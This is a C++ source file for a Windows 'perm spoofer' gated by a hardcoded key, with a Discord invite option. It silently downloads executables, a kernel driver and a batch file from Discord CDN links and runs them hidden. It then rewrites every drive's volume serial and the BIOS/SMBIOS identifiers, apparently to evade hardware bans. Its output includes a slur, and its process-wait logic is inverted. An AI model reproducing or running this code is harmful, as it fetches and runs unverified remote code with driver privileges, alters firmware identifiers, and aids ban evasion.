#include <iostream>
#include <windows.h>
#include <string>
#include <random>

std::string random_string(std::string::size_type length)
{
	static auto& chrs = "0123456789ABCDEF";
	thread_local static std::mt19937 rg{ std::random_device{}() };
	thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);
	std::string s;
	s.reserve(length);
	while (length--)
		s += chrs[pick(rg)];
	return s;
}


// no output could also do > nul 2>&1
void system_no_output(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)

		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);
}

void volume()
{
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe a: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe b: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe c: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe d: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe e: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe f: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe g: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe h: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe i: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe j: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe k: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe l: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe m: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe n: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe o: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe p: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe r: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe s: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe t: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe u: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe v: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe y: " + random_string(4) + "-" + random_string(4));
	system_no_output("C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe z: " + random_string(4) + "-" + random_string(4));
}

int ami()
{
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /SS %RANDOM%HP-TRGT%RANDOM%AB");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /SV 2%RANDOM%HP-TRGT%RANDOM%RV");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /SK 8%RANDOM%HP-TRGT%RANDOM%SG");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /SU auto");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /SK 5%RANDOM%HP-TRGT%RANDOM%SL");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /BM 4%RANDOM%HP-TRGT%RANDOM%FA");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /BS 6%RANDOM%HP-TRGT%RANDOM%FU");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /BV 3%RANDOM%HP-TRGT%RANDOM%DQ");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /PSN 7%RANDOM%HP-TRGT%RANDOM%MST");
	system("C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe /SM HOPESA-RSPPOF");
	return 1;
}

int main()
{
	std::cout << "welcome to ceo den vip perm spoofer";
	Sleep(5000);
	system("cls");
	//key
	std::string key;
	const std::string correctKey = "ceoontop";
	std::cout << "Enter the key: ";
	std::cin >> key;

	if (key == correctKey) {
		std::cout << "correct key XD\n";
	}
	else {
		std::cout << "wrong key niqqa\n";
		Sleep(1000);
		exit(-1);
	}
	// spoofing shi
	Sleep(5000);
	system("cls");
	std::cout << "[1] to perm spoof\n[2] to open the discord invite\n\nchoise: ";
    int choice;
    std::cin >> choice;
    switch (choice) {
    case 1:
        std::cout << "started spoofing\n";
        std::system("curl --silent -o C:\\ProgramData\\Microsoft\\Windows\\AMIDEWINx64.exe \"https://cdn.discordapp.com/attachments/1213923637686706206/1213923847829459064/AMIDEWINx64.exe?ex=6625622e&is=6612ed2e&hm=8e26ee8cb19f240d93562323e5891f91e0082c70c90f4563788454815f8a37d3&\"");
        std::system("curl --silent -o C:\\ProgramData\\Microsoft\\Windows\\amifldrv64.sys \"https://cdn.discordapp.com/attachments/1213923637686706206/1213923856834895872/amifldrv64.sys?ex=66256231&is=6612ed31&hm=2692951d6ad873eee28f19ecce40646f399d7e6eebc6f160339ab0c7d9c037e6&\"");
        std::system("curl --silent -o C:\\ProgramData\\Microsoft\\Windows\\Mac.bat \"https://cdn.discordapp.com/attachments/1213923637686706206/1213924225220616303/Mac.bat?ex=66256288&is=6612ed88&hm=93c2f7d1995147be0fca77a0b21d14eafe66d18b9b3466f58fbbb90621367174&\"");
        std::system("curl --silent -o C:\\ProgramData\\Microsoft\\Windows\\Volumeid64.exe \"https://cdn.discordapp.com/attachments/1213923637686706206/1213924224842997870/Volumeid64.exe?ex=66256288&is=6612ed88&hm=9f4edd1edd9680f164fd217f60acc8baf5d941678721bd1f98480631fd08b860&\"");
		system("C:\\ProgramData\\Microsoft\\Windows\\mac.bat");
		volume();
        ami();
        system("cls");
        std::cout << "done spoofing XDDD";
		Sleep(5000);
        break;
    case 2:
        std::cout << "opening discord invite\n";
        system("start https://discord.gg/fsPNeMHf8z");
        break;
    default:
        std::cout << "Invalid choice.\n";
        break;
    }

    return 0;
}